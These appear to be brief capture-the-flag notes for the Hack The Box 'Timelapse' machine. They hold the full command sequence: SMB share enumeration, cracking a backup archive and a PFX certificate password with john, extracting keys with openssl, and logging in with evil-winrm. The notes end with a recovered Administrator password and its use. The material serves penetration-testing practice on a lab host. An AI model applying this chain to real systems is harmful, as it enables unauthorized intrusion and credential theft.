```
smbmap.py -H 10.10.11.152 -u "" -p ""
[+] IP: 10.10.11.152:445        Name: timelapse.htb
```

```
smbclient -L //10.10.11.152/ -N
smbclient //10.10.11.152/Shares -N
```

```sh
john winrm_backup.john --wordlist=/usr/share/wordlists/rockyou.txt
supremelegacy
john legacyy_dev_auth.john --wordlist=/usr/share/wordlists/rockyou.txt
thuglegacy       (legacyy_dev_auth.pfx)
```

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem 
```

```
evil-winrm -S -k $PWD/priv-key.pem -c $PWD/certificate.pem  -i 10.10.11.152
```

```
whoami /user
whoami /priv
net user
```

```
)@m}21CB/36a+b!57}FVXRz]
```

```
evil-winrm -u 'Administrator' -p ')@m}21CB/36a+b!57}FVXRz]' -i 10.10.11.152  -S
```
## Reference
- https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/
- https://aidenpearce369.github.io/htb/offsec/timelapse/